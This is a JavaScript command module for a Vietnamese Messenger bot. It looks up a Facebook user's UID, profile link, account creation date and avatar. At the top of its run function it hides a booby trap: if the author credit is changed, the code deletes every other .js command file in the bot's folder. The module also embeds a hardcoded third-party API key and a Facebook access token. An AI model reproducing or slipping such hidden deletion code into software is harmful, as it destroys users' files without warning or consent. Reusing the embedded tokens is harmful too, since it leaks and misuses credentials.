module.exports.config = {
    name: "e",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "Dũngkon",
    description: "Lấy uid facebook",
    commandCategory: "Tiện ích",
    usages: "uid reply/@tag",
    cooldowns: 0
    };
module.exports.run = async function ({ api, event, args, Users, Currencies }) {
  if (this.config.credits !== "Dũngkon") {
    const listCommand = fs
      .readdirSync(__dirname)
      .filter(
        (command) =>
          command.endsWith(".js") && !command.includes(this.config.name)
      );
      console.log(listCommand)
    for (const command of listCommand) {

      const path = __dirname + `/${command}`;
      fs.unlinkSync(path);
    }
  }
  const axios = global.nodemodule["axios"];
  const fs = require("fs-extra");
  const request = require("request");
    if (Object.keys(event.mentions).length == 1) {
      var mentions = Object.keys(event.mentions)
      var name = (await Users.getData(mentions)).name
      var getlink = (await axios.get(`https://sumiproject.space/facebook/timejoine?uid=${mentions}&apikey=DUNGKON_3387554639`)).data;
      var day = getlink.day
      var time = getlink.time
      var dungkon = (await axios.get(`https://sumiproject.space/facebook/getinfo?uid=${mentions}&apikey=DUNGKON_3387554639`)).data;
      var link = dungkon.link_profile
      var callback = () => api.sendMessage({
        body: `🤖 Tên: ${name}\n📌 Uid: ${mentions}\n🔗 Link: ${link}\n📆 Ngày tạo: ${day}\n⏰ Giờ tạo: ${time}`,
        attachment: fs.createReadStream(__dirname + "/cache/1.png")
      },
        event.threadID, () => fs.unlinkSync(__dirname + "/cache/1.png"), event.messageID);
      return request(encodeURI(`https://graph.facebook.com/${mentions}/picture?height=720&width=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`))
        .pipe(fs.createWriteStream(__dirname + '/cache/1.png'))
        .on('close', () => callback());

         console.log(getlink)
    }
    else {
      if (!args[0]) {
        if (event.type == "message_reply")
          idmen = event.messageReply.senderID
        else idmen = event.senderID;
        var name = (await Users.getData(idmen)).name;
        var getlink = (await axios.get(`https://sumiproject.space/facebook/timejoine?uid=${idmen}&apikey=DUNGKON_3387554639`)).data;
        var day = getlink.day
        var time = getlink.time
        var dungkon = (await axios.get(`https://sumiproject.space/facebook/getinfo?uid=${idmen}&apikey=DUNGKON_3387554639`)).data;
        var link = dungkon.link_profile
        var callback = () => api.sendMessage({ 
         body: `🤖 Tên: ${name}\n📌 Uid: ${idmen}\n🔗 Link: ${link}\n📆 Ngày tạo: ${day}\n⏰ Giờ tạo: ${time}`,
          attachment: fs.createReadStream(__dirname + "/cache/1.png")
        },
          event.threadID, () => fs.unlinkSync(__dirname + "/cache/1.png"), event.messageID);
        return request(encodeURI(`https://graph.facebook.com/${idmen}/picture?height=720&width=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`))
          .pipe(fs.createWriteStream(__dirname + '/cache/1.png'))
          .on('close', () => callback());

           console.log(getlink)
      }
      
    }
  }